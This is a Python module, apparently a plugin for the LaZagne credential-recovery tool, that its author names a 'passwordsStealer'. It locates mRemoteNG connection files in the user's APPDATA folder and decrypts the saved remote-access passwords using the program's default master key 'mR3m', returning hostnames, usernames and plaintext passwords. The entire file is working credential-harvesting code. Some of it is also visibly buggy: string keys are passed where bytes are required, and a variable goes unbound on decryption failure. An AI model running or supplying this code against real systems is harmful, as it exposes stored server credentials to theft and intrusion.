#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
This module requires LaZagne: https://github.com/AlessandroZ/LaZagne/releases/
Current source: https://github.com/AlessandroZ/LaZagne
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__source__ = "https://github.com/mauricelambert/mRemoteNGpasswordsStealer"

from lazagne.config.write_output import print_debug
from lazagne.config.module_info import ModuleInfo

from Crypto.Util.Padding import unpad
from hashlib import pbkdf2_hmac, md5
from xml.dom.minidom import parse
from Crypto.Cipher import AES
from base64 import b64decode
from os.path import join
from io import BytesIO
from os import environ
from glob import glob


class mRemoteNG(ModuleInfo):

    """
    This class searches for and decrypts mRemoteNG passwords.
    """

    def __init__(self):
        self.files = self.get_configuration_files()
        self.password = "mR3m"
        self.success_coutner = 0
        self.errors_counter = 0

        ModuleInfo.__init__(self, "mRemoteNG", "sysadmin")

    def gcm_decrypt(self, password):

        """
        This function decrypts GCM passwords.
        """

        password_buffer = BytesIO(password)

        salt = password_buffer.read(16)
        nonce = password_buffer.read(16)

        if not nonce:
            print_debug(
                "DEBUG",
                "Blank password.",
            )
            return ""

        data_tag = password_buffer.read()
        data = data_tag[:-16]
        tag = data_tag[-16:]

        key = pbkdf2_hmac("sha1", self.password, salt, 1000, dklen=32)

        cipher = AES.new(key, AES.MODE_GCM, nonce)
        cipher.update(salt)

        try:
            secrets = cipher.decrypt_and_verify(data, tag).decode()
        except ValueError:
            self.errors_counter += 1
            print_debug(
                "FAILED",
                "Decryption failed the master password is probably incorrect.",
            )
        else:
            print_debug(
                "DEBUG",
                "Password decrypted successfully.",
            )
            self.success_coutner += 1

        return secrets

    def cbc_decrypt(self, password):

        """
        This function decrypts CBC passwords.
        """

        iv = password[:16]
        data = password[16:]

        cipher = AES.new(self.password, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(data), AES.block_size).decode()

    def decrypt(self, password):

        """
        This function decrypts mRemoteNG passwords.
        """

        password = b64decode(password.encode())
        return self._decrypt(password)

    def run(self, software_name = None):

        """
        This function starts password recovery.
        """

        parser = self.parser
        return [
            credentials for file in self.files for credentials in parser(file)
        ]

    def parser(self, filename):

        """
        This function parses the mRemoteNG configuration file.
        """

        event = parse(filename).firstChild

        if event.nodeName != "mrng:Connections":
            print_debug("ERROR", "Invalid configuration file.")

        block_cipher = event.attributes.getNamedItem("BlockCipherMode")

        if block_cipher is None:
            print_debug("ERROR", "Invalid configuration file.")

        ciphername = block_cipher.nodeValue
        if ciphername != "GCM" and ciphername != "CBC":
            print_debug("ERROR", "Invalid block cipher mode.")

        if ciphername == "CBC":
            self.password = md5(self.password).digest()
            self._decrypt = self.cbc_decrypt
        elif ciphername == "GCM":
            self._decrypt = self.gcm_decrypt

        self.block_cipher = block_cipher
        decrypt = self.decrypt

        for node in event.getElementsByTagName("Node"):
            username = node.attributes.getNamedItem("Username")
            hostname = node.attributes.getNamedItem("Hostname")
            password = node.attributes.getNamedItem("Password")

            if password is not None:
                password = decrypt(password.nodeValue)
            else:
                password = ""

            if username is not None:
                username = username.nodeValue
            else:
                username = ""

            if hostname is not None:
                hostname = hostname.nodeValue
            else:
                hostname = ""

            yield {
                "Hostname": hostname,
                "Username": username,
                "Password": password,
            }

    def get_configuration_files(self):

        """
        This function returns the default mRemoteNG configuration files.
        """

        return glob(
            join(
                environ["APPDATA"],
                "mRemoteNG",
                "confCons.xml*",
            )
        )
